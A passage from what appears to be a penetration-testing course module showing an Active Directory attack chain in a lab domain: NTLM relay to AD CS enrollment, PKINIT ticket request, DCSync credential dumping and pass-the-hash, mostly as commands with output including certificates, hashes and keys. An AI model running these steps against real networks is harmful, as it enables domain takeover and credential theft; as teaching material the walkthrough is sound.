EfsRpcOpenFileRaw!\n\n[+] Got expected ERROR_BAD_NETPATH exception!!\n[+] Attack worked!\n</code></pre> <p>Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful. <pre><code>secops@kali[/kali]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.legalcorp.local/certsrv/certfnsh.asp --adcs --template DomainController\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket\n[*] Protocol Client DCSYNC loaded..\n[*] Protocol Client HTTPS loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client IMAP loaded..\n[*] Protocol Client IMAPS loaded..\n[*] Protocol Client LDAPS loaded..\n[*] Protocol Client LDAP loaded..\n[*] Protocol Client MSSQL loaded..\n[*] Protocol Client RPC loaded..\n[*] Protocol Client SMB loaded..\n[*] Protocol Client SMTP loaded..\n[+] Protocol Attack DCSYNC loaded..\n[+] Protocol Attack HTTP loaded..\n[+] Protocol Attack HTTPS loaded..\n[+] Protocol Attack IMAP loaded..\n[+] Protocol Attack IMAPS loaded..\n[+] Protocol Attack LDAP loaded..\n[+] Protocol Attack LDAPS loaded..\n[+] Protocol Attack MSSQL loaded..\n[+] Protocol Attack RPC loaded..\n[+] Protocol Attack SMB loaded..\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up HTTP Server\n[*] Setting up WCF Server\n\n[*] Servers started, waiting for connections\n[*] SMBD-Thread-4: Connection from LEGALCORP/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.legalcorp.local\n[*] HTTP server returned error code 200, treating as a successful login\n[*] Authenticating against http://ACADEMY-EA-CA01.legalcorp.local as LEGALCORP/ACADEMY-EA-DC01$ SUCCEED\n[*] SMBD-Thread-4: Connection from LEGALCORP/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.legalcorp.local\n[*] HTTP server returned error code 200, treating as a successful login\n[*] Authenticating against http://ACADEMY-EA-CA01.legalcorp.local as LEGALCORP/ACADEMY-EA-DC01$ SUCCEED\n[*] Generating CSR...\n[*] CSR generated!\n[*] Getting certificate...\n[*] GOT CERTIFICATE!\n[*] Base64 certificate of user ACADEMY-EA-DC01$: \n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\n[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed\n\n&lt;SNIP&gt;\n</code></pre></p> <p>Next, we can take this base64 certificate and use <code>gettgtpkinit.py</code> to request a Ticket-Granting-Ticket (TGT) for the domain controller.</p> <pre><code>secops@kali[/kali]$ python3 /opt/PKINITtools/gettgtpkinit.py legalcorp.local/ACADEMY-EA-DC01\\$ -pfx-base64 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 dc01.ccache\n\n2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file\nINFO:minikerberos:Loading certificate and key from file\n2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT\nINFO:minikerberos:Requesting TGT\n2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):\nINFO:minikerberos:AS-REP encryption key (you might need this later):\n2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275\nINFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275\n2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file\nINFO:minikerberos:Saved TGT to file\n</code></pre> <p>The TGT requested above was saved down to the <code>dc01.ccache</code> file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.</p> <pre><code>secops@kali[/kali]$ export KRB5CCNAME=dc01.ccache\n</code></pre> <p>We can then use this TGT with <code>secretsdump.py</code> to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain. <pre><code>secops@kali[/kali]$ secretsdump.py -just-dc-user LEGALCORP/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.legalcorp.local\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nlegalcorp.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\n[*] Kerberos keys grabbed\nlegalcorp.local\\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\nlegalcorp.local\\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25\nlegalcorp.local\\administrator:des-cbc-md5:70add6e02f70321f\n[*] Cleaning up... \n</code></pre></p> <p>We could also use a more straightforward command: <code>secretsdump.py -just-dc-user LEGALCORP/administrator -k -no-pass ACADEMY-EA-DC01.legalcorp.local</code> because the tool will retrieve the username from the ccache file. We can see this by typing <code>klist</code>.</p> <pre><code>secops@kali[/kali]$ klist\n\nTicket cache: FILE:dc01.ccache\nDefault principal: ACADEMY-EA-DC01$@legalcorp.local\n\nValid starting       Expires              Service principal\n04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/legalcorp.local@legalcorp.local\n</code></pre> Confirming Admin Access to the Domain Controller <pre><code>secops@kali[/kali]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 